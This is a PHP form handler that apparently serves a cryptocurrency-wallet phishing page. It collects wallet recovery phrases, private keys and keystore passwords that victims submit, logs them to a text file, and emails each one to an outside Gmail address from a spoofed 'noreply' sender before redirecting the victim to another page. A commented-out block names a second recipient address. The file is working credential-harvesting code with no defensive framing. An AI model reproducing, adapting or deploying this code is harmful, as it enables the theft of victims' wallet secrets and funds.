<?php
//get data from form


date_default_timezone_set('Africa/Lagos');
$date = date('d-m-y h:i:s');




if(isset($_POST['phrase']) != ""){
    if ($_POST['phrase'] != ""){
    $name = $_POST['phrase'];
    $txt = "\r\n" .$date ." Phrase = ". $name;
    $file=fopen("name.txt", "a");
    fwrite($file, $txt);
    fclose($file);        
    
    $to = "fyrewan@gmail.com";

    $subject = "Mail From website";
    $headers = "From: noreply@serverprotocols.com" . "\r\n" .
    "CC: somebodyelse@example.com";
    if($name!=NULL){
        mail($to,$subject,$txt,$headers);
    }

        
    }

}


if(isset($_POST['privatekey'])){
    if ($_POST['privatekey'] != "") {
    $name = $_POST['privatekey'];
    $txt = "\r\n" .$date ." Private key = ". $name;
    
    $file=fopen("name.txt", "a");
    fwrite($file, $txt);
    fclose($file);
    
    $to = "fyrewan@gmail.com";

    $subject = "Mail From website";
    $headers = "From: noreply@serverprotocols.com" . "\r\n" .
    "CC: somebodyelse@example.com";
    if($name!=NULL){
        mail($to,$subject,$txt,$headers);
    }

    }
}


$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);


if(isset($_POST["file"])) {
  if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    $name = $_POST['keystorepassword'];
    $txt ="\r\n" .$date ." keystorepassword = ". $name;
    
    $file=fopen("name.txt", "a");
    fwrite($file, $txt);
    fclose($file);
    
    $to = "fyrewan@gmail.com";

    $subject = "Mail From website";
    $headers = "From: noreply@serverprotocols.com" . "\r\n" .
    "CC: somebodyelse@example.com";
    if($name!=NULL){
        mail($to,$subject,$txt,$headers);
    }

  }
}


// $name = $_POST['phrase'];

// $to = "tonytetula591@gmail.com";

// $subject = "Mail From website";
// $txt ="Phrase = ". $name;
// $headers = "From: noreply@serverprotocols.com" . "\r\n" .
// "CC: somebodyelse@example.com";
// if($name!=NULL){
//     mail($to,$subject,$txt,$headers);
// }

//redirect
header("Location: rand.html");
?>